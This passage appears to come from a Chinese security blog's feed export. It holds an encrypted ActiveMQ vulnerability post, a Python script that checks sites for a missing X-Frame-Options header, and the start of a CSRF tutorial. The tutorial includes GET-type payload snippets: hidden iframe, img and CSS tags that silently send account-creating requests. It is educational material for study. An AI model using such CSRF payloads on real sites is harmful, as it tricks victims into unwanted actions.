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
</div>
<script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>漏洞复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>ActiveMQ</tag>
      </tags>
  </entry>
  <entry>
    <title>clickjack</title>
    <url>/2019/10/28/clickjack/</url>
    <content><![CDATA[<h3 id="clickjack-check"><a href="#clickjack-check" class="headerlink" title="clickjack_check"></a>clickjack_check</h3><blockquote>
<p>巩固写代码，顺便使用loguru记录日志emmm；此处本质上就是检测返回数据包中是否存在X-FRAME-OPTIONS</p>
</blockquote>
<p>废话不说，直接上代码</p>
<h4 id="非面向对象"><a href="#非面向对象" class="headerlink" title="非面向对象"></a>非面向对象</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">click_check</span><span class="params">(url)</span>:</span></span><br><span class="line">    base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">    log_file_path = os.path.join(base_dir,<span class="string">'/Log/click_test.log'</span>)</span><br><span class="line">    <span class="comment"># print(base_dir)</span></span><br><span class="line">    headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>&#125;</span><br><span class="line">    respone = requests.get(url=url,headers=headers,timeout=<span class="number">6</span>)</span><br><span class="line">    <span class="keyword">if</span> respone.status_code == <span class="number">200</span>:</span><br><span class="line">        print(<span class="string">'[+]Target stability'</span>)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            hea = respone.headers</span><br><span class="line">            req1 = <span class="string">'[-]X-FRAME-OPTIONS '</span> + hea[<span class="string">'X-FRAME-OPTIONS'</span>]</span><br><span class="line">            req2 = <span class="string">'[-]X-FRAME-OPTIONS header, no click hijacking vulnerability can be used'</span></span><br><span class="line">            logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            req1 = <span class="string">'[+]There is no X-FRAME-OPTIONS header. There is a clicking hijacking vulnerability'</span></span><br><span class="line">            req2 = <span class="string">'[!]Remind:It may be a defense against JS. Please test it yourself'</span></span><br><span class="line">            logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">            logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        print(<span class="string">'[-]bjective instability'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    parse = argparse.ArgumentParser(description=<span class="string">'Poc for clickjack.'</span>)</span><br><span class="line">    parse.usage = <span class="string">"python3 clickjack.py [-h] [-u URL] "</span></span><br><span class="line">    parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The website to be tested Url'</span>)</span><br><span class="line">    args = parse.parse_args()</span><br><span class="line">    <span class="keyword">if</span> args.url:</span><br><span class="line">        url = args.url</span><br><span class="line">        click_check(url)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        parse.print_help()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:      </span><br><span class="line">    main()</span><br></pre></td></tr></table></figure>
<h4 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h4><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">import</span> os,sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib3</span><br><span class="line"><span class="keyword">from</span> loguru <span class="keyword">import</span> logger</span><br><span class="line">urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">click_jack</span><span class="params">(object)</span>:</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line"><span class="meta">    @property</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self)</span>:</span></span><br><span class="line">        <span class="keyword">return</span> self._url</span><br><span class="line">    </span><br><span class="line"><span class="meta">    @url.setter</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">url</span><span class="params">(self,url)</span>:</span></span><br><span class="line">        self._url = url</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(self)</span>:</span></span><br><span class="line">        base_dir = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))</span><br><span class="line">        log_file_path = os.path.join(base_dir,<span class="string">'/Log/click_test.log'</span>)</span><br><span class="line">        <span class="comment"># print(base_dir)</span></span><br><span class="line">        headers = &#123;<span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36'</span>&#125;</span><br><span class="line">        respone = requests.get(url=self._url,headers=headers,timeout=<span class="number">6</span>)</span><br><span class="line">        <span class="keyword">if</span> respone.status_code == <span class="number">200</span>:</span><br><span class="line">            print(<span class="string">'[+]Target stability'</span>)</span><br><span class="line">            <span class="keyword">try</span>:</span><br><span class="line">                hea = respone.headers</span><br><span class="line">                req1 = <span class="string">'[-]X-FRAME-OPTIONS '</span> + hea[<span class="string">'X-FRAME-OPTIONS'</span>]</span><br><span class="line">                req2 = <span class="string">'[-]X-FRAME-OPTIONS header, no click hijacking vulnerability can be used'</span></span><br><span class="line">                logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">                logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">            <span class="keyword">except</span>:</span><br><span class="line">                req1 = <span class="string">'[+]There is no X-FRAME-OPTIONS header. There is a clicking hijacking vulnerability'</span></span><br><span class="line">                req2 = <span class="string">'[!]Remind:It may be a defense against JS. Please test it yourself'</span></span><br><span class="line">                logger.add(log_file_path, format=<span class="string">"&#123;time:YYYY-MM-DD at HH:mm:ss&#125;-&#123;level&#125; &#123;message&#125;"</span>,level=<span class="string">"INFO"</span>,encoding=<span class="string">'utf-8'</span>)</span><br><span class="line">                logger.info(<span class="string">'\n'</span> + req1 + <span class="string">'\n'</span> + req2)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(<span class="string">'[-]bjective instability'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">(self)</span>:</span></span><br><span class="line">        parse = argparse.ArgumentParser(description=<span class="string">'Poc for clickjack.'</span>)</span><br><span class="line">        parse.usage = <span class="string">"python3 clickjack.py [-h] [-u URL] "</span></span><br><span class="line">        parse.add_argument(<span class="string">'-u'</span>,<span class="string">'--url'</span>,help=<span class="string">'The website to be tested Url'</span>)</span><br><span class="line">        args = parse.parse_args()</span><br><span class="line">        <span class="keyword">if</span> args.url:</span><br><span class="line">            url = args.url</span><br><span class="line">            self._url = url</span><br><span class="line">            self.check()</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            parse.print_help()</span><br><span class="line">            </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    click = click_jack(<span class="string">''</span>)</span><br><span class="line">    click.main()</span><br></pre></td></tr></table></figure>
<p>效果如图：包含日志信息（日志信息如果想只存储结果，格式化时只保留message即可）</p>
<p><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572235466.73.png" alt><img src="https://demos-qq.oss-cn-beijing.aliyuncs.com/Blog/1572235483.72.png" alt></p>
<p>关于loguru可以看之前的文章</p>
<p><a href="http://www.lsowl.top/2019/10/14/Python-%E4%B8%AD%E6%9B%B4%E4%BC%98%E9%9B%85%E7%9A%84%E6%97%A5%E5%BF%97%E8%AE%B0%E5%BD%95%E6%96%B9%E6%A1%88%E2%80%94%E2%80%94loguru/">Python 中更优雅的日志记录方案</a></p>
<h3 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h3><p><a href="https://www.cnblogs.com/haq5201314/p/8992273.html" target="_blank" rel="noopener">https://www.cnblogs.com/haq5201314/p/8992273.html</a> </p>
]]></content>
      <categories>
        <category>web前端相关</category>
      </categories>
      <tags>
        <tag>界面劫持</tag>
        <tag>web前端</tag>
      </tags>
  </entry>
  <entry>
    <title>CSRF总结</title>
    <url>/2019/10/27/CSRF%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h2 id="CSRF（跨站请求伪造）"><a href="#CSRF（跨站请求伪造）" class="headerlink" title="CSRF（跨站请求伪造）"></a>CSRF（跨站请求伪造）</h2><blockquote>
<p>cross-site request forgery，是指利用受害者尚未失效的身份认证信息(cookie,session等)，诱骗其点击恶意链接或者访问包含攻击代码的页面，在受害者不知情的情况下以受害者的身份向(身份认证信息所对应的)服务器发送请求，从而完成非法操作(比如转账、修改密码、身份信息、伪装他人发文留言等)，本质上来说就是劫持用户的操作，利用服务端对于和已建立会话的客户端的信任进行的攻击 。csrf又称为xsrf，它与xss最大的区别就在于，csrf并没有盗取cookie而是直接利用。</p>
</blockquote>
<h3 id="CSRF的原理"><a href="#CSRF的原理" class="headerlink" title="CSRF的原理"></a>CSRF的原理</h3><p>利用目标用户的合法身份，以用户的名义进行非法的操作</p>
<h3 id="CSRF的分类"><a href="#CSRF的分类" class="headerlink" title="CSRF的分类"></a>CSRF的分类</h3><h4 id="GET型"><a href="#GET型" class="headerlink" title="GET型"></a>GET型</h4><p>GET型CSRF漏洞，只需要构造URL，然后诱导受害者访问利用。    HTML中可以设置src/href等地址的标签都可以发起一个GET请求：</p>
<p>利用a标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span>test<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用img标签</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>利用iframe:注意：可以设置iframe的style为display:none，以此来不显示iframe加载的内容</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://www.xxx.com/new_user.php?username=123&amp;password=123456"</span> <span class="attr">style</span>=<span class="string">"display: none"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>CSS中background利用</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">h1</span> <span class="attr">style</span>=<span class="string">"background: url('http://www.xxx.com/new_user.php?username=123&amp;password=123456');"</span>&gt;</span>CSRF<span class="tag">&lt;/<span class="name">h1</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>还有</p>
<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;link href=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img lowsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;img dynsrc=<span class="string">""</span>&gt;</span><br><span class="line">&lt;meta http-equiv=<span class="string">"refersh"</span> content=<span class="string">"0"</span>; url=<span class="string">""</span>&gt;</span><br><span class="line">&lt;frame src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;script src =<span class="string">""</span>&gt;</span><br><span class="line">&lt;bgsound src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;embed src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;audio src=<span class="string">""</span>&gt;</span><br><span class="line">&lt;table background=<span class="string">""</span>&gt;</span><br><span class="line"> </span><br><span class="line">css样式中：</span><br><span class="line">@<span class="keyword">import</span> <span class="string">""</span></span><br><span class="line">background:url(<span class="string">""</span>)</span><br></pre></td></tr></table></figure>
<p>除了固定的编写方式之外还可以通过JavaScript动态生成的标签对象或CSS对象发起GET请求。</p>
<h4 id="POST型"><a href="#POST型" class="headerlink" title="POST型"></a>POST型</h4><p>POST型CSRF漏洞，需要构造自动提交或点击提交的表单，然后诱导受害者访问或点击利用。构造表单常见是用hidden属性(只能通过form表单的方式提交)</p>
